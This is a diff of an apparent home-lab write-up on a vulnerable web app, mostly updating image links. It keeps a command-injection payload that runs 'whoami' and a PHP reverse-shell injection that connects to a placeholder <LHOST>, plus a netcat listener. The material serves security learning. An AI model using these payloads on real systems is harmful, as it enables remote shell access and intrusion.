@@ -2,20 +2,20 @@
 
 ### Website Interface:
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/bb4495ee-93e9-4730-be34-f344f9777c03)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/626a22d3-af41-4538-9ebc-564b6f540c1e)
 
 - When entering values in the input boxes, a corresponding output is generated. 
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/b8658bac-bd72-4975-b28e-cb6ac6e81185)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/17353841-fe1c-4caf-8e36-3529d6b1bc0d)
 
 - Upon inspecting the source code, I discovered certain elements or information.
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/4319fd1c-00db-41f2-a3c7-62d0a371177f)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/3c492101-a74e-4a5d-85b0-4ba9d25a84f9)
 
 - It appears that I can potentially use the output.
-- By entering the "random" value or input, I encountered a specific response or behavior.
+- By entering the "random" value or input, I encountered a specific response or behaviour.
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/75c1dc58-2d71-4c9b-a2b2-412c204c387f)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/4631c4f9-cff0-4e6f-888a-6f4f66549c38)
 
 ```html
 <div class="p-5 mb-4 bg-light rounded-3" style="background-color: none !important; padding: 0 !important">
@@ -28,7 +28,7 @@
 
 - cmd: `789)^2))}';whoami;#`
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/a8a3314e-a231-4d18-815b-7b6d8ad44027)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/d5f2c033-f456-4b7c-a404-c1d047d61252)
 
 ```html
 		<div class="p-5 mb-4 bg-light rounded-3" style="background-color: none !important; padding: 0 !important">
@@ -39,7 +39,7 @@ www-data
 - After experimenting with different payloads, you successfully landed on a PHP reverse shell, allowing you to regain a shell connection to the system.
 - cmd: `789)^2))}';php -r '$sock=fsockopen("<LHOST>",1234);exec("/bin/sh -i <&3 >&3 2>&3");';#`
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/ebd2fff6-6ff7-4a57-b4a4-0a9a676aaed9)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/298a2f8e-7b00-459b-823f-17606847ecbd)
 
 ```bash
 └─$ rlwrap nc -nvlp 1234
